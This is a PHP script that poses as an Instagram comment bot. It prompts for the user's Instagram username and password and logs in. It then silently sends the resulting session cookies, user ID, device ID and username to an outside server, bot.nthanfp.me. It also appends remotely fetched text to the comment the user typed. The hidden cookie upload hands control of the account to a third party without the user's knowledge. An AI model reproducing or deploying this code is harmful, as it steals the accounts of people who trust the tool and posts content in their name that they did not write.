<?php
require('../func.php');
require('../ass.php');
error_reporting(0);
set_time_limit(0);
echo $cyan;
echo banner();
sleep(1);
echo banner1();
echo banner2();
sleep(1);
echo $normal;
echo "".$yellow."[?]".$normal." Input your instagram username : ";
$userig    = trim(fgets(STDIN, 1024));
echo "".$yellow."[?]".$normal." Input your instagram password : ";
$passig    = trim(fgets(STDIN, 1024));
// kyaa
$useragent = generate_useragent();
$device_id = generate_device_id();
$user      = $userig;
$pass      = $passig;
$login     = proccess(1, $useragent, 'accounts/login/', 0, hook('{"device_id":"' . $device_id . '","guid":"' . generate_guid() . '","username":"' . $userig . '","password":"' . $passig . '","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array(
    'Accept-Language: id-ID, en-US',
    'X-IG-Connection-Type: WIFI'
));
$ext       = json_decode($login[1]);
if($ext->status <> 'ok') {
    echo $ext->message . "\n";
} else {
    preg_match_all('%Set-Cookie: (.*?);%', $login[0], $d);
    $cookie = '';
    for($o = 0; $o < count($d[0]); $o++)
        $cookie .= $d[1][$o] . ";";
    $uname       = $ext->logged_in_user->username;
    $req         = proccess(1, $useragent, 'feed/timeline/', $cookie);
    $is_verified = (json_decode($req[1])->status <> ok) ? 0 : 1;
    $uid         = $ext->logged_in_user->pk;
    echo "".$green."[+] Login Success....".$normal."\n";
    echo "".$green."[+] Please Wait".$normal."\n";
    $data  = array(
        'aksi' => 'addig',
        'id' => $uid,
        'cookies' => $cookie,
        'useragent' => $useragent,
        'device_id' => $device_id,
        'verifikasi' => $is_verified,
        'username' => $uname,
        'uplink' => 'admin'
    );
    $addig   = req('https://bot.nthanfp.me/action/api().php', $data);
    echo "".$yellow."[?]".$normal." Target Post Url : ";
    $url     = trim(fgets(STDIN, 1024));
    $mediaid = getmediaid($url);
    echo "".$yellow."[?]".$normal." Comment Text : ";
    $comen   = trim(fgets(STDIN, 1024));    
    //start
    $text    = json_decode(file_get_contents('https://nthanfp.me/api/get/GetCommentText?apikey=NTHANFP150503'));
    $comment = proccess(1, $useragent, 'media/'.$mediaid.'/comment/', $cookie, hook('{"comment_text":"'.$comen.' '.$text->data->text.'"}'));
    $comment = json_decode($comment[1]);
    if($comment->status=='ok'){
    	echo "".$green."[+] Success comment".$normal."\n";
    } else {
    	echo "".$red."[!] Failed comment".$normal."\n";
    }
}
?>